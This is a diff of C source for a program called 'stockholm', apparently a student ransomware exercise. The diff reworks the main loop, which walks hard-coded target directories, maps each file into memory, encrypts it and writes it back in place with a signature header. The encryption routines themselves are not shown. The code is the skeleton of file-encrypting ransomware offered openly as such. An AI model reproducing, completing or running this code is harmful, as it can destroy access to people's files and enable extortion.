@@ -1,10 +1,10 @@
 #include "stockholm.h"
 
-unsigned char *g_mapped_data;
-uint16_t g_modes;
-fa_t_stockhlm_header stockhlm_header;
+unsigned char			*g_mapped_data;
+uint16_t				g_modes;
+fa_t_stockhlm_header	g_stockhlm_header;
 
-void fa_loop_throught_directory_and_inject(char *target_dir_path, DIR *dp)
+void fa_loop_throught_directory_and_encrypt(char *target_dir_path, DIR *dp)
 {
 	// Pointer to hold directory entry information
 	struct dirent *entry;
@@ -25,14 +25,40 @@ void fa_loop_throught_directory_and_inject(char *target_dir_path, DIR *dp)
 			/* Create a mapping between the target file and the memory region occupied
 			 * by the program. This is to facilitate the memory handling to manipulate
 			 * the file data.
+			 *
+			 * Then, process the encryption
 			 */
-			if (fa_map_file_into_memory(target_path) || fa_process_mapped_data()) // Process the encryption, the injection, etc
-				continue;														  // Skip the rest of the steps in case of errors
-																				  // Write the processed data back into the file
+
+			if (fa_map_file_into_memory(target_path))
+			{
+				if (g_modes & FA_VERBOSE)
+					perror("An error occurred while attempting to map the file into memory");
+				// Skip the rest of the steps in case of errors
+				continue;
+			}
+
+			if (fa_process_mapped_data())
+			{
+				if (g_modes & FA_VERBOSE)
+					perror("An error occurred while attempting to process the mapped data");
+				continue;
+			}
+
 			// Write the final file data in the target path
-			fa_write_processed_data_to_file(target_path);
+			if (fa_write_processed_data_to_file(target_path))
+			{
+				if (g_modes & FA_VERBOSE)
+					perror("An error occurred while attempting to write the mapped data into the file");
+				continue;
+			}
 		}
 	}
+}
+
+void init_stockholm_header()
+{
+	// Set the file signature
+	fa_memcpy(g_stockhlm_header.signature, FA_SIGNATURE, FA_MAGICNBR_LEN);
 }
 
 int main(int argc, char *argv[])
@@ -56,6 +82,9 @@ int main(int argc, char *argv[])
 	// Parse the arguments given through the commannd line
 	fa_parse_argv(argv);
 
+	// Init the header that will be placed at the top of the file
+	init_stockholm_header();
+
 	// Declare the injection target directory paths
 	char *target_dir_paths[FA_TARGET_ARRAY_SIZE] = FA_TARGET_PATHS;
 
@@ -63,11 +92,10 @@ int main(int argc, char *argv[])
 	for (size_t i = 0; i < FA_TARGET_ARRAY_SIZE; ++i)
 	{
 		DIR *dp = opendir(target_dir_paths[i]);
-
 		if (!dp)
 			return 0;
 
-		fa_loop_throught_directory_and_inject(target_dir_paths[i], dp);
+		fa_loop_throught_directory_and_encrypt(target_dir_paths[i], dp);
 
 		// Close the directory stream
 		closedir(dp);
